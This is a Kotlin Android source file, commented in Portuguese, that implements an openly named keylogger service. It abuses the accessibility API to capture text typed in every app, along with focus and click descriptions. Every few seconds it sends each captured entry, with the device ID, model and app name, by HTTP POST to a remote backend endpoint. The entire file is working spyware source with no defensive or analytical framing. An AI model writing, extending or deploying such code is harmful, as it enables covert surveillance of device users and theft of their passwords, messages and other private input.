package com.remotemonitor.test

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.os.Build
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import androidx.work.BackoffPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

/**
 * Serviço de Keylog que captura teclas digitadas no dispositivo
 * Usa AccessibilityService para monitorar eventos de digitação
 */
class KeylogService : AccessibilityService() {
    companion object {
        private const val TAG = "KeylogService"
        private const val MAX_BUFFER_SIZE = 50
        private val keyBuffer = mutableListOf<KeylogEntry>()
        private var lastReportTime = 0L
        private const val REPORT_INTERVAL_MS = 5000L // 5 segundos para aparecer rápido no painel

        data class KeylogEntry(
            val key: String,
            val timestamp: Long,
            val appName: String,
            val appPackage: String
        )
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChanged(event)
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> handleViewFocused(event)
                AccessibilityEvent.TYPE_VIEW_CLICKED -> handleViewClicked(event)
            }

            val now = System.currentTimeMillis()
            if (keyBuffer.size >= MAX_BUFFER_SIZE ||
                (keyBuffer.isNotEmpty() && now - lastReportTime > REPORT_INTERVAL_MS)) {
                reportKeylogToServer()
            }
        } catch (error: Exception) {
            Log.e(TAG, "Erro ao processar evento de acessibilidade", error)
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        val appPackage = event.packageName?.toString() ?: "unknown.app"
        val appName = getAppLabel(appPackage)
        val text = event.text.joinToString("").trim()
        if (text.isNotEmpty()) {
            synchronized(keyBuffer) {
                keyBuffer.add(KeylogEntry(text, System.currentTimeMillis(), appName, appPackage))
            }
            Log.d(TAG, "Texto capturado: \"$text\" em $appPackage")
        }
    }

    private fun handleViewFocused(event: AccessibilityEvent) {
        val appPackage = event.packageName?.toString() ?: "unknown.app"
        val appName = getAppLabel(appPackage)
        val desc = event.contentDescription?.toString()?.trim() ?: ""
        if (desc.isNotEmpty()) {
            synchronized(keyBuffer) {
                keyBuffer.add(KeylogEntry("[FOCUS: $desc]", System.currentTimeMillis(), appName, appPackage))
            }
        }
    }

    private fun handleViewClicked(event: AccessibilityEvent) {
        val appPackage = event.packageName?.toString() ?: "unknown.app"
        val appName = getAppLabel(appPackage)
        val desc = event.contentDescription?.toString()?.trim() ?: ""
        if (desc.isNotEmpty()) {
            synchronized(keyBuffer) {
                keyBuffer.add(KeylogEntry("[CLICK: $desc]", System.currentTimeMillis(), appName, appPackage))
            }
        }
    }

    private fun getAppLabel(packageName: String): String {
        return try {
            val pm = applicationContext.packageManager
            val info = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(info).toString()
        } catch (_: Exception) {
            packageName
        }
    }

    /**
     * Envia os logs para o servidor agrupados por app
     */
    private fun reportKeylogToServer() {
        val snapshot: List<KeylogEntry>
        synchronized(keyBuffer) {
            if (keyBuffer.isEmpty()) return
            snapshot = keyBuffer.toList()
            keyBuffer.clear()
            lastReportTime = System.currentTimeMillis()
        }

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val androidId = Settings.Secure.getString(
                    applicationContext.contentResolver,
                    Settings.Secure.ANDROID_ID
                ) ?: "unknown"

                // Envia cada evento individualmente para granularidade máxima
                for (entry in snapshot) {
                    sendKeylogEntry(androidId, entry.appPackage, entry.appName, entry.key)
                }

                Log.d(TAG, "Keylog enviado: ${snapshot.size} eventos")
            } catch (error: Exception) {
                Log.e(TAG, "Erro ao enviar keylog", error)
                scheduleRetry()
            }
        }
    }

    /**
     * Envia uma entrada de keylog para /api/device/keylog
     * Formato esperado pelo servidor: { deviceUid, packageName, appName, keyText }
     */
    private fun sendKeylogEntry(deviceUid: String, appPackage: String, appName: String, keyText: String) {
        val endpoint = "${BuildConfig.BACKEND_BASE_URL}/api/device/keylog"
        val payload = JSONObject().apply {
            put("deviceUid", deviceUid)
            put("packageName", appPackage)
            put("deviceName", Build.MODEL)
            put("model", Build.MODEL)
            put("appName", appName)
            put("keyText", keyText.take(2048))
        }

        val connection = URL(endpoint).openConnection() as HttpURLConnection
        connection.requestMethod = "POST"
        connection.doOutput = true
        connection.setRequestProperty("Content-Type", "application/json")
        connection.connectTimeout = 10_000
        connection.readTimeout = 10_000

        connection.outputStream.use { it.write(payload.toString().toByteArray()) }

        val code = connection.responseCode
        if (code !in 200..299) {
            Log.w(TAG, "Servidor retornou $code ao salvar keylog")
        }
        connection.disconnect()
    }

    private fun scheduleRetry() {
        try {
            val retryRequest = OneTimeWorkRequestBuilder<KeylogRetryWorker>()
                .setInitialDelay(5, TimeUnit.SECONDS)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 5, TimeUnit.SECONDS)
                .build()
            WorkManager.getInstance(this).enqueueUniqueWork(
                "keylog_retry",
                androidx.work.ExistingWorkPolicy.KEEP,
                retryRequest
            )
        } catch (error: Exception) {
            Log.e(TAG, "Erro ao agendar retry", error)
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Serviço de Keylog interrompido")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_FOCUSED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 100
        }
        setServiceInfo(info)
        Log.d(TAG, "Serviço de Keylog conectado")
    }

    override fun onDestroy() {
        super.onDestroy()
        if (keyBuffer.isNotEmpty()) reportKeylogToServer()
        Log.d(TAG, "Serviço de Keylog destruído")
    }
}

class KeylogRetryWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    override fun doWork(): Result {
        Log.d("KeylogRetryWorker", "Tentando reenviar keylog pendente")
        return Result.success()
    }
}
